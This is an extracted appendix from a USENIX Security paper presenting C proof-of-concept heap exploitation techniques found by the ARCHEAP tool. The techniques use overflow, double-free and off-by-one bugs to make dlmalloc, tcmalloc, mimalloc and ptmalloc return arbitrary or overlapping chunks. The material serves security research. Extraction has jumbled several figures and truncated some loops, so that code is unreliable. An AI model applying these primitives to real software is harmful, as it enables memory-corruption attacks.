void* p0 = malloc(sz);
void* p1 = malloc(xlsz);
void* p2 = malloc(lsz);
void* p3 = malloc(sz);
// [BUG] overflowing p3 to overwrite top chunk
struct malloc_chunk *tc = raw_to_chunk(p3 + chunk_size(sz));
tc->size = 0;
void* p4 = malloc(fsz);
void* p5 = malloc(dst - p4 - chunk_size(fsz) \
- offsetof(struct malloc_chunk, fd));
assert(dst == malloc(sz));
Figure A.1: An exploitation technique for dlmalloc-2.8.6 returning
an arbitrary chunk using overflow bug that was found by ARCHEAP.
1
2
3
4
5
6
7
8
9
10
11
12
13
14
sz : any size
// [PRE-CONDITION]
//
// [BUG] buffer overflow
// [POST-CONDITION]
//
void* p = malloc(sz);
// [BUG] overflowing p
// tcmalloc has a next chunk address at the end of a chunk
*(void**)(p + malloc_usable_size(p)) = dst;
malloc(sz) == dst
// this malloc changes a next chunk address into dst
malloc(sz);
assert(malloc(sz) == dst);
Figure A.2: An exploitation technique for tcmalloc returning an
arbitrary address that was found by ARCHEAP.
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
lsz : large size (> 64 KB)
xlsz: more large size (>= lsz + 4KB)
// [PRE-CONDITION]
//
//
// [BUG] double free
// [POST-CONDITION]
//
p2 == malloc(lsz);
void* p0 = malloc(lsz);
free(p0);
void* p1 = malloc(xlsz);
// [BUG] free ’p0’ again
free(p0);
void* p2 = malloc(lsz);
free(p1);
assert(p2 == malloc(lsz));
Figure A.3: An exploitation technique for DieHarder and mimalloc-
secure triggering double free that was found by ARCHEAP.
USENIX Association
29th USENIX Security Symposium    1127
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
sz : any non-fast-bin size
// [PRE-CONDITION]
//
// [BUG] buffer overflow
// [POST-CONDITION]
//
void* p0 = malloc(sz);
void* p1 = malloc(sz);
void* p2 = malloc(sz);
malloc(sz) == dst + offsetof(struct malloc_chunk, fd)
// move p1 to the unsorted bin
free(p1);
// create a fake chunk at dst
struct malloc_chunk *fake = dst;
// set fake->size to be the chunk size of the last allocation
fake->size = chunk_size(sz);
// set fake->bk to any writable address to avoid a crash
fake->bk = fake;
// [BUG] overflowing p0
struct malloc_chunk *c1 = raw_to_chunk(p1);
// size should be smaller than the next allocation size
// to avoid returning c1 in the next allocation
// size shouldn’t be too small due to a security check
c1->size = 2 * sizeof(size_t);
// set the next pointer in the unsorted bin
c1->bk = fake;
// now unsorted bin: c1 -> fake,
// and c1 is too small for the request.
// therefore, next allocation returns the fake chunk
assert(malloc(sz) == fake \
+ offsetof(struct malloc_chunk, fd));
Figure A.4: A new exploitation technique that ARCHEAP found,
named unsorted bin into stack, that returns arbitrary memory by
corrupting the unsorted bin.
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
sz : any small bin size
sz2 : any small bin size
assert(sz2 > sz)
// [PRE-CONDITION]
//
//
//
// [BUG] buffer overflow
// [POST-CONDITION] two chunks overlap
void* p0 = malloc(sz);
void* p1 = malloc(sz);
void* p2 = malloc(sz);
// move p1 to the unsorted bin
free(p1);
// move p1 to the small bin
void* p3 = malloc(sz2);
// [BUG] overflowing p0
struct malloc_chunk *c1 = raw_to_chunk(p1);
// growing size into double
c1->size = 2 * chunk_size(sz) | 1;
// p4’s chunk size = chunk_size(sz) * 2
void *p4 = malloc(sz);
// move p4 to the unsorted bin
free(p4);
// splitting p4 into half and returning p5
void* p5 = malloc(sz);
// returning the remainder
void* p6 = malloc(sz);
// p2 and p6 overlap
assert(p2 == p6);
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
sz1: non-fast-bin size
sz2: non-fast-bin size
sz1 and sz2 have the following relationship;
assert(chunk_size(sz1) * a == chunk_size(sz2) * b);
// [PRE-CONDITION]
//
//
//
//
// [BUG] double free
// [POST-CONDITION] two chunks overlap
for (int i = 0; i = 0; i--)
free(p1[i]);
// allocate chunks to fill empty space
for (int i = 0; i prev_size = chunk_size(sz) * 2;
// [PRE-CONDITION]
//
//
// [BUG] off-by-one NULL
// [POST-CONDITION]
//
char *p1 = malloc(sz);
char *p2 = malloc(sz);
char *p3 = malloc(sz);
char *p4 = malloc(sz);
Figure A.6: A new exploitation technique that ARCHEAP found,
named unaligned double free, that returns overlapped chunks by the
double free bug.
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
// if we allocate p5,
// p2 is now points to a free chunk in the unsorted bin
char *p5 = malloc(sz);
// set fake->size to chunk_size(sz) for later allocation
fake->size = chunk_size(sz);
// set fake->bk to any writable address to avoid crash
fake->bk = (void*)buf;
struct malloc_chunk* c2 = raw_to_chunk(p2);
c2->bk = fake;
assert(raw_to_chunk(malloc(sz)) == fake);
// move p1 to unsorted bin
free(p1);
struct malloc_chunk* c3 = raw_to_chunk(p3);
// [BUG] use off-by-one NULL to make P=0 in c3
assert((c3->size & 0xff) == 0x01);
c3->size &= ~1;
// this will merge p1 & p3
free(p3);
// it’s unsorted bin into stack
struct malloc_chunk* fake = (void*)buf;
Figure A.5: A new exploitation technique that ARCHEAP found,
named overlapping chunks smallbin, that returns an overlapped
chunk in small bin. Even though this requires more steps than
overlapping chunks, it does not need accurate size for allocation.
Figure A.7: A new exploitation technique that ARCHEAP found,
named house of unsorted einherjar. This is a variant of a known heap
exploitation technique, house of einherjar, but it does not require a
heap address unlike the old one.
1128    29th USENIX Security Symposium
USENIX Association